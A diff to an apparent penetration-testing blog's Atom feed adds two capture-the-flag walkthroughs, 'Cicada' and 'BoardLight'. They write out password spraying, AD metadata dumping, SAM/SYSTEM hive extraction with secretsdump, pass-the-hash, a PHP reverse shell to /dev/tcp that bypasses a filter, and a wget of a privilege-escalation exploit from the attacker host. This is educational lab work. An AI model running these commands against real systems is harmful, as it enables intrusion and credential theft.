@@ -2,10 +2,133 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://danae-pan.github.io/Blog/blog</id>
     <title>Penetration Testing Journal Blog</title>
-    <updated>2025-05-25T00:00:00.000Z</updated>
+    <updated>2025-06-15T00:00:00.000Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://danae-pan.github.io/Blog/blog"/>
     <subtitle>Penetration Testing Journal Blog</subtitle>
+    <entry>
+        <title type="html"><![CDATA[Cicada]]></title>
+        <id>https://danae-pan.github.io/Blog/blog/Cicada</id>
+        <link href="https://danae-pan.github.io/Blog/blog/Cicada"/>
+        <updated>2025-06-15T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Task 1]]></summary>
+        <content type="html"><![CDATA[<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-1">Task 1<a href="https://danae-pan.github.io/Blog/blog/Cicada#task-1" class="hash-link" aria-label="Direct link to Task 1" title="Direct link to Task 1">​</a></h3>
+<p>What is the name of the non-default SMB share that is readable with guest access on Cicada?</p>
+<p>Running <code>smbclient -N -L //&lt;target_ip&gt;</code> to connect to the share server without providing a password and list the shares we see two non-default shares named <code>DEV</code> and <code>HR</code>.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-ci-1-7a0f8837bba661162cef6b200f1e3154.png" width="1546" height="746" class="img_ev3q"></p>
+<p>Next, to see which one is readable as a guest, we will try to connect to those specific shares. Running <code>smbclient -N //&lt;target_ip&gt;/&lt;share_name&gt;</code> we see the one we have access to read is the <code>HR</code> share.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-ci-2-eebd0b9bbbfa684c22e86f2ec6e3d7a3.png" width="1546" height="708" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-2">Task 2<a href="https://danae-pan.github.io/Blog/blog/Cicada#task-2" class="hash-link" aria-label="Direct link to Task 2" title="Direct link to Task 2">​</a></h3>
+<p>What is the name of the file found in the HR share?</p>
+<p>Seen in the previous task, from listing the contents of the HR share, the file name is "Notice from HR.txt".</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-3">Task 3<a href="https://danae-pan.github.io/Blog/blog/Cicada#task-3" class="hash-link" aria-label="Direct link to Task 3" title="Direct link to Task 3">​</a></h3>
+<p>Which user account is still using the company default password?</p>
+<p>To see the contents of the file found, we can transfer it to the host by running ``get "Notice from HR.txt". Opening it, we see a welcoming message to a new hire with the default password but it does not give a username</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-ci-3-d2178dfc2751758ad33ea1b8ab1c2ad0.png" width="1546" height="506" class="img_ev3q"></p>
+<p>Then, we can try to enumerate domain users on the target IP and save them to a file by running <code>lookupsid.py anonymous@&lt;target_ip&gt; &gt; lookupsid_output.txt</code>. Then, we save the usernames cleanly we run <code>grep '(SidTypeUser)' lookupsid_output.txt | awk -F '\\' '{print $2}' | cut -d' ' -f1 &gt; users.txt</code>.  Finally using the password found in the file, we can perform a password spray attack by running <code>netexec smb &lt;target_ip&gt; -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'</code> and find the username to be michael.wrightson.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-ci-5-c5ee995f367e271c4fee423af0310ef2.png" width="2286" height="812" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-4">Task 4<a href="https://danae-pan.github.io/Blog/blog/Cicada#task-4" class="hash-link" aria-label="Direct link to Task 4" title="Direct link to Task 4">​</a></h3>
+<p>Which user has left their password in Active Directory metadata?</p>
+<p>We dump the AD metadata using <code>ldapdomaindump -u cicada.htb\\michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' &lt;target_ip&gt;</code>. We then try the command <code>grep -iE 'pass|key|desc|comment' domain_users.json</code> to look for password in the file matching any lines that contain the mentioned keywords.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-ci-6-3faaff942dfef3c5779551800503056d.png" width="1696" height="808" class="img_ev3q"></p>
+<p>After finding the password we can try to connect with it using the users.txt file from the previous task as <code>netexec smb &lt;target_ip&gt; -u users.txt -p 'aRt$Lp#7t*VQ!3'</code>.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-ci-7-c2c4836b59b20798e6ecf167ebf3d68c.png" width="1696" height="974" class="img_ev3q"></p>
+<p><code>&lt;!-- truncate --&gt;</code></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-5">Task 5<a href="https://danae-pan.github.io/Blog/blog/Cicada#task-5" class="hash-link" aria-label="Direct link to Task 5" title="Direct link to Task 5">​</a></h3>
+<p>What is the name of the PowerShell script located in the DEV share?</p>
+<p>Connecting to the DEV share with the credential found in the previous task by running <code>smbclient //&lt;target_ip&gt;/DEV -U 'cicada.htb\\david.orelious%aRt$Lp#7t*VQ!3'</code> we find the Powershell script after listing the contents.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-ci-8-b7f78b1d4cdb385d7d9691c780196a30.png" width="1696" height="434" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-6">Task 6<a href="https://danae-pan.github.io/Blog/blog/Cicada#task-6" class="hash-link" aria-label="Direct link to Task 6" title="Direct link to Task 6">​</a></h3>
+<p>What is the emily.oscars user's password?</p>
+<p>We get the file in our host by running <code>get Backup_script.ps1</code> and after exiting smb we open the file and locate the user's password.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-ci-9-c8a6b549ad4c46725c1feb2397071325.png" width="1696" height="722" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-7">Task 7<a href="https://danae-pan.github.io/Blog/blog/Cicada#task-7" class="hash-link" aria-label="Direct link to Task 7" title="Direct link to Task 7">​</a></h3>
+<p>Submit the flag located in the emily.oscars user's home directory.</p>
+<p>We will try to connect to the default share with the credential found for emily.oscars by running <code>smbclient //&lt;target_ip&gt;/C$ -U 'cicada.htb\\emily.oscars%Q!3@Lp#M6b*7t*Vt'</code>. We then navigate to here home directory with the relative path <code>\Users\emily.oscars.CICADA\DESKTOP\</code> and run <code>get user.txt</code> to get the user flag and open it with <code>cat</code> on the host machine.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-8">Task 8<a href="https://danae-pan.github.io/Blog/blog/Cicada#task-8" class="hash-link" aria-label="Direct link to Task 8" title="Direct link to Task 8">​</a></h3>
+<p>What dangerous privilege does the emily.oscar user have associated with their account?</p>
+<p>First we connect with the credentials for the emily user <code>evil-winrm -i &lt;host_ip&gt; -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'</code>. Then, we run <code>whoami /priv</code> to display the privieges that the user holds on the system and we find that the <code>SeBackupPrivilege</code> is enabled for the current user which permits reading any file.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-ci-10-04b9627c82ae26b81611fd72b9625a9c.png" width="1422" height="602" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-9">Task 9<a href="https://danae-pan.github.io/Blog/blog/Cicada#task-9" class="hash-link" aria-label="Direct link to Task 9" title="Direct link to Task 9">​</a></h3>
+<p>What is the Administrator user's NTLM hash?</p>
+<p>Keeping the evil-winrm session active, we will save the Windows regitstry hives by running the following:</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">reg save HKLM\SAM C:\Users\emily.oscars\Documents\sam.save</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">reg save HKLM\SYSTEM C:\Users\emily.oscars\Documents\system.save</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>We download both files to the local machine by :</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">download sam.save</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">download system.save</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>Then, to extract the NTLM hashes we run <code>secretsdump.py -system system.save -sam sam.save LOCAL</code>. This command decrypts the SAM file using the SYSTEM hive and displays local user account hashes. The NTLM hash is the third colon-separated field in the output.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-ci-11-88a6433161000fe6638bef53c74332ba.png" width="1640" height="606" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-10">Task 10<a href="https://danae-pan.github.io/Blog/blog/Cicada#task-10" class="hash-link" aria-label="Direct link to Task 10" title="Direct link to Task 10">​</a></h3>
+<p>Submit the flag located on the Administrator user's Desktop.</p>
+<p>We can now perrform a Pass-The-Hash attack to impersonate the Administrator using the hash we found in the previous task. Since evil-winfrm supports PtH directly we run <code>evil-winrm -i &lt;target_ip&gt; -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341</code> and running <code>whoami</code> we validate we are "cicada\administrator". Navigating to the Desktop we get the flag by running <code>cat root.txt</code>.</p>]]></content>
+        <category label="easy" term="easy"/>
+        <category label="windows" term="windows"/>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Board Light]]></title>
+        <id>https://danae-pan.github.io/Blog/blog/BoardLight</id>
+        <link href="https://danae-pan.github.io/Blog/blog/BoardLight"/>
+        <updated>2025-06-05T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Task 1]]></summary>
+        <content type="html"><![CDATA[<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-1">Task 1<a href="https://danae-pan.github.io/Blog/blog/BoardLight#task-1" class="hash-link" aria-label="Direct link to Task 1" title="Direct link to Task 1">​</a></h3>
+<p>How many TCP ports are listening on BoardLight?</p>
+<p>By running <code>sudo nmap -sS &lt;target_ip&gt;</code> we scan for all TCP ports on the target machine.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-b-d64c828be9ebb7102d92c070a5cf9a5c.png" width="1302" height="418" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-2">Task 2<a href="https://danae-pan.github.io/Blog/blog/BoardLight#task-2" class="hash-link" aria-label="Direct link to Task 2" title="Direct link to Task 2">​</a></h3>
+<p>What is the domain name used by the box?</p>
+<p>Navigating to the web page by typing the IP address on a browser, we see at the end of the page that the contact email is <code>info@board.htb</code>. At the end of the page, we also see the copyright message "2020 All Rights Reserved By Board.htb" using the same  domain. Those are strong indications of the domain used by the box.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-3">Task 3<a href="https://danae-pan.github.io/Blog/blog/BoardLight#task-3" class="hash-link" aria-label="Direct link to Task 3" title="Direct link to Task 3">​</a></h3>
+<p>What is the name of the application running on a virtual host of board.htb?</p>
+<p>For answering this task, we can use the <code>gobuster</code> tool to brute-force subdomains via virtual host fuzzing. After adding the target IP address - domain pair on the /etc/hosts file, we run <code>gobuster vhost -u http://board.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code>.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-b-1-4f73851f770e382bdef5c661e5f3ee67.png" width="1956" height="740" class="img_ev3q"></p>
+<p>We find the <code>crm.board.htb</code> domain and we add this with the target IP address to the /etc/hosts file as well. After, we navigate to the domain name on the web browser and find the application.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-b-2-1083a7f6aa1a6060e42bebba458ecaa8.png" width="1588" height="1002" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-4">Task 4<a href="https://danae-pan.github.io/Blog/blog/BoardLight#task-4" class="hash-link" aria-label="Direct link to Task 4" title="Direct link to Task 4">​</a></h3>
+<p>What version of Dolibarr is running on BoardLight?</p>
+<p>On the top of the web page, the version for the application shows to be 17.0.0.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-5">Task 5<a href="https://danae-pan.github.io/Blog/blog/BoardLight#task-5" class="hash-link" aria-label="Direct link to Task 5" title="Direct link to Task 5">​</a></h3>
+<p>What is the default password for the admin user on Dolibarr?</p>
+<p>Since we are presented with a login page we can try the password <code>admin</code> for the user <code>admin</code> which works successfully getting as to the admin's page.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-6">Task 6<a href="https://danae-pan.github.io/Blog/blog/BoardLight#task-6" class="hash-link" aria-label="Direct link to Task 6" title="Direct link to Task 6">​</a></h3>
+<p>What is the 2023 CVE ID for an authenticated vulnerability that can lead to remote code execution in this version of Dolibarr?</p>
+<p>Searching for the version of Dolibarr on the <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-30253" target="_blank" rel="noopener noreferrer">NIST vulnerability database</a>, we find the ID to be <code>CVE-2023-30253</code>.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-7">Task 7<a href="https://danae-pan.github.io/Blog/blog/BoardLight#task-7" class="hash-link" aria-label="Direct link to Task 7" title="Direct link to Task 7">​</a></h3>
+<p>What user is the Dolibarr application running as on BoardLight?</p>
+<p>We first navigate to the "Websites" tab on the admin page and we add a Website. On the website we add a webpage by using an empty page as an example.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-b-3-89f6481727b1e459d467a162eb6cd47b.png" width="1984" height="1088" class="img_ev3q"></p>
+<p>After creating the empty page, we edit the HTML source by adding php code, changint the format to uppercase to bypass the filtering.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-b-4-b3531960b9fac930f020461a5dfcdf00.png" width="2054" height="464" class="img_ev3q"></p>
+<p>This results to succesfully executing the inserted php code. Next, we set up a listener <code>nc -lnvp 4444</code> and add a reverse shell code on the HTML source such <code>&lt;?PHP exec("/bin/bash -c 'bash -i &gt; /dev/tcp/&lt;host_ip&gt;/4444 0&gt;&amp;1'");?&gt;</code>. This gives us a connection.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-b-5-538bb91685615f823e53eb71bdc2229a.png" width="1480" height="272" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-8">Task 8<a href="https://danae-pan.github.io/Blog/blog/BoardLight#task-8" class="hash-link" aria-label="Direct link to Task 8" title="Direct link to Task 8">​</a></h3>
+<p>What is the full path of the file that contains the Dolibarr database connection information?</p>
+<p>Searching online about Dolibarr configuration files we find that it is usually under <code>/htdocs/conf/conf.php</code>. Indeed, navigating to <code>/var/www/html/crm.board.htb/htdocs/conf</code> and opening the <code>conf.php</code> file we can see the database configuration.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-b-6-0d5ea518078d57e6c5ea5ad77f67b94c.png" width="1480" height="460" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-9">Task 9<a href="https://danae-pan.github.io/Blog/blog/BoardLight#task-9" class="hash-link" aria-label="Direct link to Task 9" title="Direct link to Task 9">​</a></h3>
+<p>Sumbit the flag located in the larissa user's home directory.</p>
+<p>Navigating to the <code>/home</code> directory we see that as the user we currently are we cannot have access to the directory larissa.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-b-7-dde63cbfecf655c0719d3dcc46f56678.png" width="1480" height="158" class="img_ev3q"></p>
+<p>What we will now do, is using the database credentials we previously found in the configuration file to switch to the larissa user. We run:</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">su larissa</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">serverfun2$2023!!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>And we actually managed to gain access.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-b-8-70a9bf30f2589bcfa70359bb132056e0.png" width="980" height="192" class="img_ev3q"></p>
+<p>We go on by navigating to larisa's home directory and get the user flag by using <code>cat user.txt</code>.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-10">Task 10<a href="https://danae-pan.github.io/Blog/blog/BoardLight#task-10" class="hash-link" aria-label="Direct link to Task 10" title="Direct link to Task 10">​</a></h3>
+<p>What is the name of the desktop environment installed on Boardlight?</p>
+<p>To find the desktop environment we can run <code>ls /usr/share/xsessions</code> since this directory contains the .desktop files that define the graphical session for display managers.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-11">Task 11<a href="https://danae-pan.github.io/Blog/blog/BoardLight#task-11" class="hash-link" aria-label="Direct link to Task 11" title="Direct link to Task 11">​</a></h3>
+<p>What version of Enlightenment is installed on BoardLight?</p>
+<p>To see the version, we can open the file we found in the previous task.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-12">Task 12<a href="https://danae-pan.github.io/Blog/blog/BoardLight#task-12" class="hash-link" aria-label="Direct link to Task 12" title="Direct link to Task 12">​</a></h3>
+<p>What is the 2022 CVE ID for a vulnerability in Enlightenment versions before 0.25.4 that allows for privilege escalation?</p>
+<p>After searching fot the vulnerability on the CVE database, we find the CVE ID to be <a href="https://www.cve.org/CVERecord?id=CVE-2022-37706" target="_blank" rel="noopener noreferrer">CVE-2022-37706</a>.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-13">Task 13<a href="https://danae-pan.github.io/Blog/blog/BoardLight#task-13" class="hash-link" aria-label="Direct link to Task 13" title="Direct link to Task 13">​</a></h3>
+<p>Submit the flag located in the root user's home directory.</p>
+<p>After finding a public exploit, we open a web server on the host and on the directory that exploit file is saved with <code>pyhthon3 -m http.server 8080</code>. Then on the target we use <code>wget http://&lt;host_ip&gt;:8080/exploit.sh</code> to get the file. After getting the file we run <code>chmod +x exploit.sh</code> to make it executable. Running it, we gain root privileges.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-b-9-92ba6b862ad89a41d15c88c91ed14099.png" width="1592" height="752" class="img_ev3q"></p>
+<p>Navigating to the root directory we get the root flag by <code>cat root.txt</code>.</p>]]></content>
+        <category label="easy" term="easy"/>
+        <category label="linux" term="linux"/>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Driver]]></title>
         <id>https://danae-pan.github.io/Blog/blog/Driver</id>
@@ -45,7 +168,6 @@
 <p><code>crackmapexec winrm &lt;target_ip&gt; -u tony -p liltony</code></p>
 <p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-dr-16-55ecfa90176cce9deb2e786c7f67fb39.png" width="1674" height="268" class="img_ev3q"></p>
 <p>Since the service is enabled we can use <code>evil-winrm -i &lt;target_ip&gt; -u tony -p liltony</code>. We have access and navigating to tony's Desktop we get the flag by <code>cat user.txt</code>.</p>
-<p>10.129.192.136</p>
 <h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-7">Task 7<a href="https://danae-pan.github.io/Blog/blog/Driver#task-7" class="hash-link" aria-label="Direct link to Task 7" title="Direct link to Task 7">​</a></h3>
 <p>What is the filename that stores the command history for PowerShell for tony?</p>
 <p>Based on <a href="https://learn.microsoft.com/en-us/powershell/module/psreadline/get-psreadlineoption?view=powershell-7.5" target="_blank" rel="noopener noreferrer">Microsoft Documentation</a> the location of the command history can be revealed from the property <code>HistorySavePath</code> after running <code>Get-PSReadlineOption</code>. Trying this did not work on the WinRM because it is not a fully interactive terminal. We try to view the default location to see if the history is stored there by <code>type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"</code> and it works, thus, the filename is <code>ConsoleHost_history.txt</code>.</p>
